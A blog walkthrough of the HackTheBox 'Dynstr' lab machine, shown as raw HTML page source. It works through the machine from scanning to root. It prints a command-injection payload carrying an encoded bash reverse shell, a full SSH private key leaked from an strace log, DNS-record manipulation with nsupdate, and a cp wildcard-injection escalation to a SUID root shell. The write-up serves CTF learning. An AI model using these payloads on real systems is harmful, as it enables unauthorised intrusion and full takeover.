<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Dynstr | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it."><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/dynstr/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Dynstr"><meta property="og:description" content="Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it."><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/dynstr/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/dynstr/imgs/image-20211018030910558.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-10-18T03:04:29+07:00"><meta property="article:modified_time" content="2021-10-18T03:04:29+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/dynstr/imgs/image-20211018030910558.png"><meta name=twitter:title content="HackTheBox - Dynstr"><meta name=twitter:description content="Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Dynstr","item":"https://fahmifj.github.io/hackthebox/dynstr/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Dynstr","name":"HackTheBox - Dynstr","description":"Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.\nSkills Learned Command injection Dynamic DNS Wildcard injection Tools Nmap Burp Suite Reconnaissance Nmap A full TCP scan with nmap discovers 3 open ports: SSH on 22, BIND 9 DNS on 53, and an Apache web server on 80.\n→ root@kali «dynstr» «10.10.14.53» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport-dynstr 10.10.10.244 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-16 21:06 EDT Nmap scan report for 10.10.10.244 Host is up, received echo-reply ttl 63 (0.078s latency). Not shown: 65532 closed ports Reason: 65532 resets PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 53/tcp open domain syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Nmap done: 1 IP address (1 host up) scanned in 41.14 seconds → root@kali «dynstr» «10.10.14.53» $ nmap -p22,53,80 -sC -sV -oA nmap/10-tcp-allport-scripts-dynstr 10.10.10.244 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-16 21:07 EDT Nmap scan report for 10.10.10.244 Host is up (0.54s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.16.1-Ubuntu 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Dyna DNS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.76 seconds Enumeration TCP 80 - Website On port 80, there is a company website named DYNA DNS.\nThis company offers a dynamic DNS service and states that the service is still in beta. There is also shared credentials to use this service.\nAt the bottom of the page, it reveals another domain name: dyna.htb.\nI will update my /etc/hosts with all the discovered domain names :\n→ root@kali «dynstr» «10.10.14.53» $ echo '10.10.10.244 dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb' These domain points to the same site.\n→ root@kali «dynstr» «10.10.14.53» $ curl -s http://10.10.10.244/ | wc -c 10909 → root@kali «dynstr» «10.10.14.53» $ for i in dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb; do curl -s http://$i/ | wc -c; done 10909 10909 10909 10909 DNS API As previously stated in the website, it seems to use the dynamic DNS service, I can refer to no-ip.com:\nTo use the service, I will send a request and supply the shared credentials ('dynadns:sndanyd') in the Authorization header:\nIt returned with good.\nWith dig, I can confirm that my domain name has been added to the DNS entry.\n→ root@kali «dynstr» «10.10.14.53» $ dig @10.10.10.244 iamf.no-ip.htb ; \u003c\u003c\u003e\u003e DiG 9.11.5-P4-5.1+b1-Debian \u003c\u003c\u003e\u003e @10.10.10.244 iamf.no-ip.htb ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 38459 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: a795fc705ec31c660100000060cab226fe335467b6b169e8 (good) ;; QUESTION SECTION: ;iamf.no-ip.htb. IN A ;; ANSWER SECTION: iamf.no-ip.htb. 30 IN A 10.10.14.53 ;; Query time: 864 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Wed Jun 16 22:23:34 EDT 2021 ;; MSG SIZE rcvd: 87 Foothold Shell as www-data Identify Command Injection On Linux, there is a dynamic DNS utility called nsupdate. If the backend uses this utility with no sanitization on the input, it is possible to do a command injection.\nFor the first attempt, I try to submit a semicolon, and it fails the update process.\nIf I search for that error on Google, I will see this post from StackOverflow, which shows how nsupdate is executed from PHP using the built-in exec() function.\nBy assuming that my input falls in update add $MYINPUT.no-ip.htb ..., I try to submit `echo+iamf1`. It again responded with “good”.\nChecking with dig shows that my domain iamf1.no-ip.htb has been added to the DNS entry. This means the API is vulnerable to command injection.\n→ root@kali «dynstr» «10.10.14.53» $ dig @10.10.10.244 iamf1.no-ip.htb ; \u003c\u003c\u003e\u003e DiG 9.11.5-P4-5.1+b1-Debian \u003c\u003c\u003e\u003e @10.10.10.244 iamf1.no-ip.htb ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 65360 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 8164817dd17125330100000060cab5248a60afa8ae9615d7 (good) ;; QUESTION SECTION: ;iamf1.no-ip.htb. IN A ;; ANSWER SECTION: iamf1.no-ip.htb. 30 IN A 10.10.14.53 ;; Query time: 735 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Wed Jun 16 22:36:20 EDT 2021 ;; MSG SIZE rcvd: 88 I also assume that the update command is enclosed with EOF, and when I put \" to enclose it, the server response leaks how it updates the DNS entry.\nReverse Shell To avoid bad characters, I will encode the reverse shell payload with double base64.\n→ root@kali «dynstr» «10.10.14.53» $ echo \"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.53/9000 0\u003e\u00261'\" |base64 |base64 -w0 WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg== The final query will looks like this.\n/nic/update?hostname=\"`echo+WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg==+|base64+-d|base64+-d|bash`+iamf.no-ip.htb\u0026myip=10.10.14.53 On my listener\n→ root@kali «dynstr» «10.10.14.53» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.53] from (UNKNOWN) [10.10.10.244] 49648 bash: cannot set terminal process group (659): Inappropriate ioctl for device bash: no job control in this shell www-data@dynstr:/var/www/html/nic$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) I will upgrade my shell.\nwww-data@dynstr:/var/www/html/nic$ export TERM=xterm export TERM=xterm www-data@dynstr:/var/www/html/nic$ which python3 which python3 /usr/bin/python3 www-data@dynstr:/var/www/html/nic$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 'ython3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@dynstr:/var/www/html/nic$ ^Z [1] + 7584 suspended nc -nvlp 9000 → root@kali «dynstr» «10.10.14.53» $ stty raw -echo; fg [1] + 7584 continued nc -nvlp 9000 www-data@dynstr:/var/www/html/nic$ Privilege Escalation Shell as bindmgr Enumeration Under /home/bindmgr/support-case-C62796521, there are several files that are readable by others.\nwww-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -l total 428 -rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script -rw-r--r-- 1 bindmgr bindmgr 29312 Mar 13 14:53 C62796521-debugging.timing -rw-r--r-- 1 bindmgr bindmgr 1175 Mar 13 14:53 command-output-C62796521.txt -rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txt The strace-C62796521.txt file contains a SSH private key.\nwww-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt ...[SNIP]... 15123 openat(AT_FDCWD, \"/home/bindmgr/.ssh/id_rsa\", O_RDONLY) = 5 15123 fstat(5, {st_mode=S_IFREG|0600, st_size=1823, ...}) = 0 15123 read(5, \"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\\n-----END OPENSSH PRIVATE KEY-----\\n\", 4096) = 1823 But when I try to use that key for SSH login, it asks for a password.\n→ root@kali «ssh-keys» «10.10.14.53» $ ssh -i bindmgr_rsa bindmgr@10.10.10.244 bindmgr@10.10.10.244's password: My first guess is SSH has been configured to password only, but I find that UseDNS is enabled here.\nwww-data@dynstr:/home$ cat /etc/ssh/sshd_config | grep -v '^#' | awk 'NF' Include /etc/ssh/sshd_config.d/*.conf PermitRootLogin yes ChallengeResponseAuthentication no UsePAM yes X11Forwarding yes PrintMotd no UseDNS yes AcceptEnv LANG LC_* Subsystem sftp /usr/lib/openssh/sftp-server Then if I look at the authorized keys, it seems SSH login only possible from a specific domain that starts with *.infra.dyna.htb.\nwww-data@dynstr:/home/bindmgr$ ls -l .ssh/ ls -l total 16 -rw-r--r-- 1 bindmgr bindmgr 419 Mar 13 14:53 authorized_keys -rw------- 1 bindmgr bindmgr 1823 Mar 13 14:53 id_rsa -rw-r--r-- 1 bindmgr bindmgr 395 Mar 13 14:53 id_rsa.pub -rw-r--r-- 1 bindmgr bindmgr 444 Mar 13 14:53 known_hosts www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys from=\"*.infra.dyna.htb\" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen Update DNS Looking at the DNS configuration under /etc/bind reveals that dyna.htb is not available for customers (via API) and it uses different key (/etc/bind/infra.key).\nwww-data@dynstr:/etc/bind/$ cat named.conf.local // // Do any local configuration here // // Add infrastructure DNS updates. include \"/etc/bind/infra.key\"; zone \"dyna.htb\" IN { type master; file \"dyna.htb.zone\"; update-policy { grant infra-key zonesub ANY; }; }; zone \"10.in-addr.arpa\" IN { type master; file \"10.in-addr.arpa.zone\"; update-policy { grant infra-key zonesub ANY; }; }; zone \"168.192.in-addr.arpa\" IN { type master; file \"168.192.in-addr.arpa.zone\"; update-policy { grant infra-key zonesub ANY; }; }; // Enable DynDNS updates to customer zones. include \"/etc/bind/ddns.key\"; zone \"dnsalias.htb\" IN { type master; file \"dnsalias.htb.zone\"; update-policy { grant ddns-key zonesub ANY; }; }; zone \"dynamicdns.htb\" IN { type master; file \"dynamicdns.htb.zone\"; update-policy { grant ddns-key zonesub ANY; }; }; zone \"no-ip.htb\" IN { type master; file \"no-ip.htb.zone\"; update-policy { grant ddns-key zonesub ANY; }; }; // *** WORK IN PROGRESS, see bindmgr.sh *** // include \"/etc/bind/named.conf.bindmgr\"; The idea here is to add a sub domain to dyna.htb zone, and it must be part of infra.dyna.htb, such as iamf.infra.dyna.htb. I will also point that domain to my IP so I can SSH from my machine. These all can be done with the following commands.\nwww-data@dynstr:/etc/bind$ nsupdate -k ./infra.key \u003e update add iamf.infra.dyna.htb 3600 A 10.10.14.53 \u003e update add 53.14.10.10.in-addr.arpa. 600 PTR iamf.infra.dyna.htb \u003e show Outgoing update query: ;; -\u003e\u003eHEADER\u003c\u003c- opcode: UPDATE, status: NOERROR, id: 0 ;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0 ;; UPDATE SECTION: iamf.infra.dyna.htb. 0 ANY A iamf.infra.dyna.htb. 3600 IN A 10.10.14.53 53.14.10.10.in-addr.arpa. 600 IN PTR iamf.infra.dyna.htb. \u003e send I can confirm with dig that my domain has been added.\n→ root@kali «dynstr» «10.10.14.53» $ dig @10.10.10.244 iamf.infra.dyna.htb ; \u003c\u003c\u003e\u003e DiG 9.11.5-P4-5.1+b1-Debian \u003c\u003c\u003e\u003e @10.10.10.244 iamf.infra.dyna.htb ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 56211 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 7d13ea1a1d5d21b90100000060cb40c0b256362f3bd3da35 (good) ;; QUESTION SECTION: ;iamf.infra.dyna.htb. IN A ;; ANSWER SECTION: iamf.infra.dyna.htb. 3600 IN A 10.10.14.53 ;; Query time: 59 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Thu Jun 17 08:31:59 EDT 2021 ;; MSG SIZE rcvd: 92 SSH bindmgr Now I can SSH login as bindmgr\n→ root@kali «ssh-keys» «10.10.14.53» $ ssh -i bindmgr_rsa bindmgr@10.10.10.244 Last login: Tue Jun 8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb bindmgr@dynstr:~$ id uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr) The flag:\nbindmgr@dynstr:~$ ls -l total 8 drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521 -r-------- 1 bindmgr bindmgr 33 Jun 17 10:51 user.txt bindmgr@dynstr:~$ cat user.txt 6404e...[SNIP]... Shell as root Enumeration Checking for sudo permissions reveals that bindmgr is allowed to run a script called bindmgr.sh as root.\nbindmgr@dynstr:~$ sudo -l sudo: unable to resolve host dynstr.dyna.htb: Name or service not known Matching Defaults entries for bindmgr on dynstr: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User bindmgr may run the following commands on dynstr: (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh The author gives a well documented about what this script does.\n#!/usr/bin/bash # This script generates named.conf.bindmgr to workaround the problem # that bind/named can only include single files but no directories. # # It creates a named.conf.bindmgr file in /etc/bind that can be included # from named.conf.local (or others) and will include all files from the # directory /etc/bin/named.bindmgr. # # NOTE: The script is work in progress. For now bind is not including # named.conf.bindmgr. # # TODO: Currently the script is only adding files to the directory but # not deleting them. As we generate the list of files to be included # from the source directory they won't be included anyway. BINDMGR_CONF=/etc/bind/named.conf.bindmgr BINDMGR_DIR=/etc/bind/named.bindmgr indent() { sed 's/^/ /'; } # Check versioning (.version) echo \"[+] Running $0 to stage new configuration from $PWD.\" if [[ ! -f .version ]] ; then echo \"[-] ERROR: Check versioning. Exiting.\" exit 42 fi if [[ \"`cat .version 2\u003e/dev/null`\" -le \"`cat $BINDMGR_DIR/.version 2\u003e/dev/null`\" ]] ; then echo \"[-] ERROR: Check versioning. Exiting.\" exit 43 fi # Create config file that includes all files from named.bindmgr. echo \"[+] Creating $BINDMGR_CONF file.\" printf '// Automatically generated file. Do not modify manually.\\n' \u003e $BINDMGR_CONF for file in * ; do printf 'include \"/etc/bind/named.bindmgr/%s\";\\n' \"$file\" \u003e\u003e $BINDMGR_CONF done # Stage new version of configuration files. echo \"[+] Staging files to $BINDMGR_DIR.\" cp .version * /etc/bind/named.bindmgr/ # Check generated configuration with named-checkconf. echo \"[+] Checking staged configuration.\" named-checkconf $BINDMGR_CONF \u003e/dev/null if [[ $? -ne 0 ]] ; then echo \"[-] ERROR: The generated configuration is not valid. Please fix following errors: \" named-checkconf $BINDMGR_CONF 2\u003e\u00261 | indent exit 44 else echo \"[+] Configuration successfully staged.\" # *** TODO *** Uncomment restart once we are live. # systemctl restart bind9 if [[ $? -ne 0 ]] ; then echo \"[-] Restart of bind9 via systemctl failed. Please check logfile: \" systemctl status bind9 else echo \"[+] Restart of bind9 via systemctl succeeded.\" fi fi The first two if statement show that the script wants a file called .version, and since it looks from $PWD, I can create that file in anywhere.\nbindmgr@dynstr:~$ echo '5' \u003e .version Then when I run the script, it throws the following error.\nbindmgr@dynstr:~$ sudo bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr. [+] Creating /etc/bind/named.conf.bindmgr file. [+] Staging files to /etc/bind/named.bindmgr. cp: -r not specified; omitting directory 'support-case-C62796521' [+] Checking staged configuration. [-] ERROR: The generated configuration is not valid. Please fix following errors: /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/support-case-C62796521: file not found And this one is interesting\ncp: -r not specified; omitting directory 'support-case-C62796521' If I trace it, the error come from these lines.\n# Stage new version of configuration files. echo \"[+] Staging files to $BINDMGR_DIR.\" cp .version * /etc/bind/named.bindmgr/ According to Hackingarticles, using cp with * can lead to wildcard injection.\nExploitation To exploit cp with * (wildcard), I will create a copy of the bash binary and set SUID permissions on it, and then I will create another file with a filename --preserve=mode.\nbindmgr@dynstr:/dev/shm$ echo '5' \u003e .version bindmgr@dynstr:/dev/shm$ touch '--preserve=mode' bindmgr@dynstr:/dev/shm$ cp /bin/bash . bindmgr@dynstr:/dev/shm$ chmod u+s bash bindmgr@dynstr:/dev/shm$ ls -la total 1164 drwxrwxrwt 2 root root 100 Jun 17 15:18 . drwxr-xr-x 17 root root 3940 Jun 17 10:51 .. -rwsr-sr-x 1 bindmgr bindmgr 1183448 Jun 17 15:18 bash -rw-rw-r-- 1 bindmgr bindmgr 1 Jun 17 15:12 '--preserve=mode' -rw-rw-r-- 1 bindmgr bindmgr 2 Jun 17 14:47 .version cp will see that --preserve=mode file as name as a flag/option/switch, so it becomes\n$ cp .version --preserve=mode /etc/bind/named.bindmgr/ When I run bindmgr.sh again, it throws another error.\nbindmgr@dynstr:/dev/shm$ sudo bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm. [+] Creating /etc/bind/named.conf.bindmgr file. [+] Staging files to /etc/bind/named.bindmgr. [+] Checking staged configuration. [-] ERROR: The generated configuration is not valid. Please fix following errors: /etc/bind/named.bindmgr/bash:1: unknown option 'ELF☻☺☺...' /etc/bind/named.bindmgr/bash:14: unknown option '♥h□ȀE□♣' /etc/bind/named.bindmgr/bash:40: unknown option '□YF' /etc/bind/named.bindmgr/bash:40: unexpected token near '}' But now under /etc/bind/named.bindmgr, I have a copy of bash with SUID permissions set to root.\nbindmgr@dynstr:/dev/shm$ ls -la /etc/bind/named.bindmgr total 1168 drwxr-sr-x 2 root bind 4096 Jun 17 15:18 . drwxr-sr-x 3 root bind 4096 Jun 17 15:18 .. -rwsr-sr-x 1 root bind 1183448 Jun 17 15:18 bash -rw-rw-r-- 1 root bind 2 Jun 17 15:18 .version Executing that bash with -p gives me a root shell.\nbindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p bash-5.0# id uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr) bash-5.0# whoami root The flag\nbash-5.0# ls -l total 8 drwxr-xr-x 4 root root 4096 Mar 14 14:18 cleanup -r-------- 1 root root 33 Jun 17 10:51 root.txt bash-5.0# cat root.txt 64348...[SNIP]... ","wordCount":"2513","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/dynstr/imgs/image-20211018030910558.png","datePublished":"2021-10-18T03:04:29+07:00","dateModified":"2021-10-18T03:04:29+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/dynstr/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" 